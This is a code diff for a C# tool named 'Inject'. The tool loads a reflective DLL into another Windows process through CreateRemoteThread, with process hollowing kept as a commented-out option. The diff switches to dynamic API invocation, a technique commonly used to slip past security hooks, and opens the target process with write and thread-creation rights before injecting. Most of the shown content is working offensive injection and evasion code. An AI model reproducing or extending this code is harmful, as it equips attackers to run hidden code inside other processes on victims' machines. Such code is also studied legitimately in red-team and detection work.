@@ -3,11 +3,13 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
+using System.Runtime.InteropServices;
 using System.Runtime.Remoting.Contexts;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using WinAPI;
+using WinAPI.Data.Kernel32;
 using WinAPI.Wrapper;
 
 namespace Inject
@@ -23,8 +25,8 @@ namespace Inject
 
         static void Main(string[] args)
         {
-            //APIWrapper.Config.PreferedAccessType = WinAPI.Wrapper.APIAccessType.DInvoke;
-            APIWrapper.Config.PreferedAccessType = WinAPI.Wrapper.APIAccessType.PInvoke;
+            APIWrapper.Config.PreferedAccessType = WinAPI.Wrapper.APIAccessType.DInvoke;
+            //APIWrapper.Config.PreferedAccessType = WinAPI.Wrapper.APIAccessType.PInvoke;
             APIWrapper.Config.PreferedInjectionMethod = WinAPI.Wrapper.InjectionMethod.CreateRemoteThread;
             //APIWrapper.Config.PreferedInjectionMethod = WinAPI.Wrapper.InjectionMethod.ProcessHollowingWithAPC;
 
@@ -38,8 +40,6 @@ namespace Inject
             {
 
                 Console.WriteLine($"[?] WinAPIAccess = {APIWrapper.Config.PreferedAccessType}");
-
-                IntPtr hToken = IntPtr.Zero;
 
                 /************* new processs***************/
 
@@ -80,8 +80,23 @@ namespace Inject
                     return;
                 }
 
+                IntPtr hProcess = APIWrapper.OpenProcess(process.Id, ProcessAccessFlags.PROCESS_VM_WRITE |
+    ProcessAccessFlags.PROCESS_VM_OPERATION |
+    ProcessAccessFlags.PROCESS_CREATE_THREAD);
+                // OUVRIR UN NOUVEAU HANDLE AVEC LES BONS DROITS
+                //IntPtr hProcess = WinAPI.DInvoke.Kernel32.NtOpenProcess(
+                //    (uint)processId,
+                //    ProcessAccessFlags.PROCESS_ALL_ACCESS
+                //);
+
+                if (hProcess == IntPtr.Zero)
+                {
+                    Console.WriteLine($"Failed to open process with sufficient rights. Error: {Marshal.GetLastWin32Error()}");
+                    return;
+                }
+
                 var offset = WinAPI.Helper.ReflectiveLoaderHelper.GetReflectiveFunctionOffset(reflectiveDll, "ReflectiveFunction");
-                APIWrapper.Inject(process.Handle, IntPtr.Zero, reflectiveDll, offset);
+                APIWrapper.Inject(hProcess, IntPtr.Zero, reflectiveDll, offset);
 
             }
             catch (Exception ex)
